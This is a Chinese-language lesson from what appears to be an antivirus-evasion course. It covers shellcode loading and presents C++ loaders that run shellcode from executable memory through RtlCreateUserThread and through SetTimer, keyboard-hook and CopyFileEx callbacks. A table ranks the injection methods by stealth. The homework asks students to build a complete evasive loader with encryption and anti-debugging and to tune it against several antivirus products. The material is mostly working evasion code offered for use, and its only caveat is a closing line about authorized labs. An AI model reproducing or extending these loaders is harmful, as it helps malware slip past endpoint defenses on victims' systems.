# 课时41：基础补充ShellCode加载方式（续）

## 1. 课程目标

继续补充ShellCode加载方式，完成免杀专题学习。

---

## 2. 更多加载方式

### 2.1 RtlCreateUserThread

```cpp
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG,
    PULONG, PULONG, LPTHREAD_START_ROUTINE, PVOID, PHANDLE, PVOID);

void ExecuteViaRtlCreateUserThread() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    pRtlCreateUserThread RtlCreateUserThread = 
        (pRtlCreateUserThread)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserThread");
    
    HANDLE hThread = NULL;
    CLIENT_ID cid = { 0 };
    
    RtlCreateUserThread(GetCurrentProcess(), NULL, FALSE, 0,
                        NULL, NULL, (LPTHREAD_START_ROUTINE)pMem,
                        NULL, &hThread, &cid);
    
    WaitForSingleObject(hThread, INFINITE);
}
```

### 2.2 SetTimer回调

```cpp
void ExecuteViaSetTimer() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    MSG msg;
    SetTimer(NULL, 0, 100, (TIMERPROC)pMem);
    
    // 消息循环触发定时器
    GetMessage(&msg, NULL, 0, 0);
    DispatchMessage(&msg);
}
```

### 2.3 SetWindowsHookEx

```cpp
// 使用钩子执行
void ExecuteViaHook() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // 设置键盘钩子，回调指向ShellCode
    SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)pMem, NULL, 0);
    
    // 需要消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
```

### 2.4 CopyFileEx回调

```cpp
void ExecuteViaCopyFileEx() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // CopyFileEx会调用进度回调
    CopyFileExW(L"C:\\Windows\\System32\\kernel32.dll",
                L"C:\\temp\\test.dll",
                (LPPROGRESS_ROUTINE)pMem,
                NULL, NULL, 0);
}
```

---

## 3. 内存注入总结

| 方法 | API | 隐蔽性 | 兼容性 |
|------|-----|--------|--------|
| CreateThread | kernel32 | 低 | 高 |
| CreateRemoteThread | kernel32 | 中 | 高 |
| NtCreateThreadEx | ntdll | 中高 | 中 |
| RtlCreateUserThread | ntdll | 中高 | 中 |
| APC | kernel32/ntdll | 高 | 高 |
| 回调函数 | 各种 | 高 | 高 |
| 异常处理 | kernel32/ntdll | 高 | 高 |
| Fiber | kernel32 | 高 | 高 |

---

## 4. 免杀专题总结

本章我们学习了：

1. **进程伪装与注入** - 进程镂空、模块镂空、APC注入
2. **API绑过** - 直接Syscall、NTDLL重载、ETW绕过
3. **UAC绕过** - 白名单利用、DLL劫持、COM对象
4. **保护机制** - PPL、ACG、CFG
5. **ShellCode技术** - 加密、混淆、花指令
6. **检测绕过** - 特征码定位、行为欺骗、反调试

---

## 5. 课后作业

### 作业1：综合项目（必做）

1. 实现一个完整的免杀Loader
2. 包含：加密、多种加载方式、反调试

### 作业2：对抗测试（进阶）

1. 在多款杀软环境测试
2. 分析被检测原因并改进

---

## 6. 后续学习建议

1. 深入学习Windows内核机制
2. 研究最新的安全软件检测技术
3. 关注新披露的绕过技术
4. 在合法授权环境下进行实验

---

**免杀专题完结**

感谢学习！安全技术需要负责任地使用。
